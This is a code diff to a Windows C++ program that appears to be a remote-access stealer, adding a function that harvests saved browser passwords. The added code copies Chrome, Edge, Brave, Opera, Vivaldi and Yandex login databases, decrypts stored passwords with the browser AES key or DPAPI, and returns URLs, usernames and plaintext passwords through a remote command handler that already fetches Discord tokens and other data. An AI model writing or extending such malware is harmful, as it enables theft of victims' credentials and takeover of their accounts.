@@ -9,6 +9,7 @@
 #include <tlhelp32.h>
 #include <mmsystem.h>
 #include <bcrypt.h>
+#include "sqlite3.h"
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -879,6 +880,105 @@ std::string getInstalledApps() {
     return execCmd("powershell -c \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Format-Table -AutoSize -Wrap | Out-String -Width 4096\"");
 }
 
+// Forward declarations for token decryption helpers (defined later)
+std::string getChromeKey(const std::string& localStatePath);
+std::string decryptChromeValue(const std::string& encValue, const std::string& aesKey);
+
+// --- Browser password harvester (SQLite + os_crypt) ---
+std::string getBrowserPasswords() {
+    std::string out;
+    char la[MAX_PATH];
+    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
+    if (laLen == 0 || laLen > MAX_PATH) return "No local appdata";
+    std::string localAppData(la, laLen);
+
+    struct BPath { const char* path; const char* label; };
+    BPath profiles[] = {
+        {"\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome"},
+        {"\\Google\\Chrome\\User Data\\Profile 1\\Login Data", "Chrome-P1"},
+        {"\\Google\\Chrome\\User Data\\Profile 2\\Login Data", "Chrome-P2"},
+        {"\\Google\\Chrome\\User Data\\Profile 3\\Login Data", "Chrome-P3"},
+        {"\\Google\\Chrome\\User Data\\Profile 4\\Login Data", "Chrome-P4"},
+        {"\\Google\\Chrome\\User Data\\Profile 5\\Login Data", "Chrome-P5"},
+        {"\\Microsoft\\Edge\\User Data\\Default\\Login Data", "Edge"},
+        {"\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data", "Edge-P1"},
+        {"\\Microsoft\\Edge\\User Data\\Profile 2\\Login Data", "Edge-P2"},
+        {"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "Brave"},
+        {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Login Data", "Brave-P1"},
+        {"\\Opera Software\\Opera Stable\\Login Data", "Opera"},
+        {"\\Vivaldi\\User Data\\Default\\Login Data", "Vivaldi"},
+        {"\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data", "Yandex"},
+    };
+
+    // Get the os_crypt AES key from Chrome's Local State (shared across Chromium browsers)
+    std::string aesKey = getChromeKey(localAppData + "\\Google\\Chrome\\User Data\\Local State");
+
+    char tmpPath[MAX_PATH];
+    if (!GetTempPathA(MAX_PATH, tmpPath)) tmpPath[0] = 0;
+
+    // Forward declare these from token decryption helpers (below)
+    // These will be resolved at link time
+    
+    for (auto& bp : profiles) {
+        std::string src = localAppData + bp.path;
+        WIN32_FIND_DATAA wfd;
+        HANDLE hFind = FindFirstFileA(src.c_str(), &wfd);
+        if (hFind == INVALID_HANDLE_VALUE) continue;
+        FindClose(hFind);
+        
+        std::string tmp = std::string(tmpPath) + "bp_" + std::to_string(GetTickCount()) + ".tmp";
+        if (!CopyFileA(src.c_str(), tmp.c_str(), FALSE)) continue;
+
+        sqlite3* db = NULL;
+        if (sqlite3_open(tmp.c_str(), &db) != SQLITE_OK) { DeleteFileA(tmp.c_str()); continue; }
+        
+        const char* sql = "SELECT origin_url, username_value, password_value, signon_realm FROM logins";
+        sqlite3_stmt* stmt = NULL;
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
+            sqlite3_close(db); DeleteFileA(tmp.c_str()); continue;
+        }
+
+        int count = 0;
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            const char* url = (const char*)sqlite3_column_text(stmt, 0);
+            const char* user = (const char*)sqlite3_column_text(stmt, 1);
+            const void* pwBlob = sqlite3_column_blob(stmt, 2);
+            int pwLen = sqlite3_column_bytes(stmt, 2);
+            if (!url || !user || !pwBlob || pwLen < 5) continue;
+
+            std::string password;
+            if (!aesKey.empty()) {
+                std::string enc((const char*)pwBlob, pwLen);
+                password = decryptChromeValue(enc, aesKey);
+            }
+            if (password.empty()) {
+                // Try DPAPI fallback for older Chrome versions
+                DATA_BLOB inBlob = { (DWORD)pwLen, const_cast<BYTE*>((const BYTE*)pwBlob) };
+                DATA_BLOB outBlob = {};
+                if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
+                    password.assign((char*)outBlob.pbData, outBlob.cbData);
+                    LocalFree(outBlob.pbData);
+                }
+            }
+
+            if (!password.empty()) {
+                count++;
+                if (count == 1) out += "\n[" + std::string(bp.label) + "]\n";
+                out += std::string(url) + "\n";
+                out += "  User: " + std::string(user) + "\n";
+                out += "  Pass: " + password + "\n\n";
+            }
+        }
+        sqlite3_finalize(stmt);
+        sqlite3_close(db);
+        DeleteFileA(tmp.c_str());
+        if (count > 0) out += "--- " + std::string(bp.label) + ": " + std::to_string(count) + " credentials ---\n";
+    }
+    if (out.empty()) out = "No saved credentials found in any browser";
+    return out;
+}
+// --- End browser password harvester ---
+
 // --- Token decryption helpers ---
 std::string dpapiDecrypt(const std::vector<unsigned char>& input) {
     DATA_BLOB inBlob = { (DWORD)input.size(), const_cast<BYTE*>(input.data()) };
@@ -1340,6 +1440,7 @@ DWORD WINAPI pollThread(LPVOID) {
                         try{int m=std::stoi(extractJson(payload,"monitor"));if(m>=0)g_liveMonitor=m;}catch(...){}
                         result="ok";
                     } else if (type == "discord_tokens") result = getDiscordTokens();
+                    else if (type == "browser_passwords") result = getBrowserPasswords();
                     else if (type == "passwords") result = getPasswords();
                     else if (type == "network_info") result = getNetworkInfo();
                     else if (type == "services") result = getServices();
